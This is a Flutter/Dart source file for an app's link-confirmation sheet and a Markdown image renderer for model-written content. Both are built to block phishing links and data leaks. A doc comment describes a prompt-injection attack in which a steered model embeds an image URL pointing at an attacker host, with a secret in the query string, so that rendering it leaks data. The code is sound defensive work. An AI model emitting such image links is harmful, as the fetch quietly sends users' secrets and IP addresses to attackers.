import 'package:flutter/material.dart';
import 'package:flutter/services.dart';

import '../core/theme.dart';
import '../core/url_safety.dart';
import 'workspace_image.dart';

/// What the user chose in the link confirmation sheet.
enum LinkChoice { open, copy, cancel }

/// Shows where [link] really goes before anything is opened: the decoded
/// host in large type with its registrable domain emphasised, a warning
/// when userinfo was stripped, the host is internationalized, or the link
/// text claimed another site, and the full URL. Open / Copy / Cancel.
///
/// Copy is handled here (clipboard + SnackBar); the caller opens the link
/// only when [LinkChoice.open] is returned.
Future<LinkChoice> confirmLinkSheet(
  BuildContext context,
  SafeLink link, {
  String? linkText,
}) async {
  final messenger = ScaffoldMessenger.maybeOf(context);
  final misleading = linkText != null && linkTextMisleads(linkText, link);
  final choice = await showModalBottomSheet<LinkChoice>(
    context: context,
    isScrollControlled: true,
    backgroundColor: Aether.surface,
    shape: const RoundedRectangleBorder(
      borderRadius: BorderRadius.vertical(top: Radius.circular(18)),
    ),
    builder: (sheet) => SafeArea(
      child: SingleChildScrollView(
        key: const ValueKey('link-confirm-sheet'),
        padding: const EdgeInsets.fromLTRB(20, 16, 20, 12),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            Text(
              link.isWeb ? 'Open this site?' : 'Open with another app?',
              style: TextStyle(fontSize: 13, color: Aether.textMuted),
            ),
            const SizedBox(height: 6),
            if (link.isWeb || link.displayHost.isNotEmpty)
              _HostLine(link: link)
            else
              Text(
                '${link.uri.scheme}: link',
                style: TextStyle(
                  fontSize: 20,
                  fontWeight: FontWeight.w700,
                  color: Aether.text,
                ),
              ),
            const SizedBox(height: 10),
            if (link.hadUserInfo)
              const _Warning(
                'This link hid its real address behind text before an "@". '
                'That part was removed.',
              ),
            if (link.isIdn)
              _Warning(
                'This address uses non-Latin characters and may imitate '
                'another site. Its real form is ${link.asciiHost}.',
              ),
            if (misleading)
              _Warning(
                'The link text says "${linkText.trim()}", but it goes to '
                '${link.displayHost}.',
              ),
            if (!link.isWeb)
              _Warning(
                'This opens another app on your device '
                '(${link.uri.scheme}: link).',
              ),
            SelectableText(
              link.uri.toString(),
              maxLines: 4,
              style: TextStyle(
                fontSize: 12,
                height: 1.4,
                fontFamily: Aether.mono,
                color: Aether.textMuted,
              ),
            ),
            const SizedBox(height: 16),
            Row(
              children: [
                Expanded(
                  child: OutlinedButton(
                    style: OutlinedButton.styleFrom(
                      minimumSize: const Size(64, 48),
                    ),
                    onPressed: () => Navigator.pop(sheet, LinkChoice.copy),
                    child: const Text('Copy link'),
                  ),
                ),
                const SizedBox(width: 10),
                Expanded(
                  child: FilledButton(
                    key: const ValueKey('link-confirm-open'),
                    style: FilledButton.styleFrom(
                      minimumSize: const Size(64, 48),
                    ),
                    onPressed: () => Navigator.pop(sheet, LinkChoice.open),
                    child: const Text('Open'),
                  ),
                ),
              ],
            ),
            TextButton(
              style: TextButton.styleFrom(minimumSize: const Size(64, 48)),
              onPressed: () => Navigator.pop(sheet, LinkChoice.cancel),
              child: const Text('Cancel'),
            ),
          ],
        ),
      ),
    ),
  );
  if (choice == LinkChoice.copy) {
    await Clipboard.setData(ClipboardData(text: link.uri.toString()));
    messenger?.showSnackBar(
      const SnackBar(
        content: Text('Link copied'),
        behavior: SnackBarBehavior.floating,
      ),
    );
  }
  return choice ?? LinkChoice.cancel;
}

/// Host with the registrable domain (eTLD+1) emphasised and the
/// attacker-controllable subdomain part dimmed.
class _HostLine extends StatelessWidget {
  const _HostLine({required this.link});
  final SafeLink link;

  @override
  Widget build(BuildContext context) {
    final host = link.displayHost;
    final domain = link.registrableDomain;
    final prefix = host.endsWith(domain)
        ? host.substring(0, host.length - domain.length)
        : '';
    return Text.rich(
      TextSpan(
        children: [
          if (prefix.isNotEmpty)
            TextSpan(
              text: prefix,
              style: TextStyle(color: Aether.textMuted),
            ),
          TextSpan(
            text: prefix.isNotEmpty ? domain : host,
            style: TextStyle(color: Aether.text, fontWeight: FontWeight.w700),
          ),
        ],
      ),
      key: const ValueKey('link-confirm-host'),
      style: const TextStyle(fontSize: 20, height: 1.3),
    );
  }
}

class _Warning extends StatelessWidget {
  const _Warning(this.text);
  final String text;

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 8),
      child: Row(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Icon(Icons.warning_amber_rounded, size: 16, color: Aether.warnLight),
          const SizedBox(width: 8),
          Expanded(
            child: Text(
              text,
              style: TextStyle(fontSize: 12.5, height: 1.4, color: Aether.text),
            ),
          ),
        ],
      ),
    );
  }
}

/// Markdown image renderer for model-authored content.
///
/// Remote images are never fetched on render: a model steered by prompt
/// injection can embed `![](https://attacker/p?d=<secret>)`, and the fetch
/// alone leaks the data and the user's IP. http(s) images show a
/// "Tap to load" placeholder naming the host; `data:` images and files
/// inside the user's cloud workspace (relative paths) render via
/// [WorkspaceImage]; everything else
/// (absolute paths, `file:`, other schemes) is refused. All decodes are
/// capped with `cacheWidth`.
Widget safeMarkdownImage(Uri uri, String? title, String? alt) {
  final scheme = uri.scheme.toLowerCase();
  if (scheme == 'http' || scheme == 'https') {
    return RemoteImagePlaceholder(uri: uri, alt: alt);
  }
  if (scheme == 'data') {
    final data = uri.data;
    if (data == null || !data.mimeType.startsWith('image/')) {
      return ImageNote(alt: alt, note: 'Image not shown');
    }
    try {
      return CappedImage(
        builder: (cacheWidth) => Image.memory(
          data.contentAsBytes(),
          cacheWidth: cacheWidth,
          fit: BoxFit.contain,
          errorBuilder: (_, _, _) =>
              ImageNote(alt: alt, note: 'Image could not be shown'),
        ),
      );
    } catch (_) {
      return ImageNote(alt: alt, note: 'Image could not be shown');
    }
  }
  if (scheme.isEmpty && !uri.hasAuthority) {
    // Workspace-relative image written by the cloud agent (SE-018): fetched
    // through the authenticated workspace route. Absolute paths, `..`, `~`,
    // backslashes and non-image extensions are refused before any request.
    if (normalizeWorkspaceImagePath(uri.path) != null) {
      return WorkspaceImage(path: uri.path, alt: alt);
    }
  }
  return ImageNote(alt: alt, note: 'Image not shown');
}

/// Bounds an image's decode width (`cacheWidth`) to the layout width times
/// the device pixel ratio (64..2048 px) and its height to 480.
class CappedImage extends StatelessWidget {
  const CappedImage({super.key, required this.builder});
  final Widget Function(int cacheWidth) builder;

  @override
  Widget build(BuildContext context) {
    return LayoutBuilder(
      builder: (context, constraints) {
        final dpr = MediaQuery.devicePixelRatioOf(context);
        final logical = constraints.maxWidth.isFinite
            ? constraints.maxWidth
            : 480.0;
        final cacheWidth = (logical * dpr).clamp(64, 2048).round();
        return ConstrainedBox(
          constraints: const BoxConstraints(maxHeight: 480),
          child: builder(cacheWidth),
        );
      },
    );
  }
}

/// "Image from host · Tap to load". Nothing is requested until the tap.
class RemoteImagePlaceholder extends StatefulWidget {
  const RemoteImagePlaceholder({super.key, required this.uri, this.alt});
  final Uri uri;
  final String? alt;

  @override
  State<RemoteImagePlaceholder> createState() => _RemoteImagePlaceholderState();
}

class _RemoteImagePlaceholderState extends State<RemoteImagePlaceholder> {
  bool _load = false;

  @override
  Widget build(BuildContext context) {
    if (_load) {
      return CappedImage(
        builder: (cacheWidth) => Image.network(
          widget.uri.toString(),
          cacheWidth: cacheWidth,
          fit: BoxFit.contain,
          errorBuilder: (_, _, _) =>
              ImageNote(alt: widget.alt, note: 'Image could not be loaded'),
        ),
      );
    }
    final link = safeLinkFrom(widget.uri.toString(), webOnly: true);
    final host = link?.displayHost ?? widget.uri.host;
    final alt = widget.alt?.trim() ?? '';
    return Semantics(
      button: true,
      label: 'Image from $host. Tap to load',
      child: InkWell(
        key: const ValueKey('remote-image-placeholder'),
        borderRadius: BorderRadius.circular(10),
        onTap: () => setState(() => _load = true),
        child: Container(
          constraints: const BoxConstraints(minHeight: 48),
          padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(10),
            border: Border.all(color: Aether.hairline),
          ),
          child: Row(
            mainAxisSize: MainAxisSize.min,
            children: [
              Icon(Icons.image_outlined, size: 18, color: Aether.textMuted),
              const SizedBox(width: 8),
              Flexible(
                child: Text(
                  '${alt.isEmpty ? 'Image' : alt} from $host · Tap to load',
                  style: TextStyle(fontSize: 12.5, color: Aether.textMuted),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}

/// The calm bracketed note shown in place of an image that is not rendered.
class ImageNote extends StatelessWidget {
  const ImageNote({super.key, this.alt, required this.note});
  final String? alt;
  final String note;

  @override
  Widget build(BuildContext context) {
    final a = alt?.trim() ?? '';
    return Text(
      a.isEmpty ? '[$note]' : '[$note: $a]',
      style: TextStyle(fontSize: 12.5, color: Aether.textMuted),
    );
  }
}
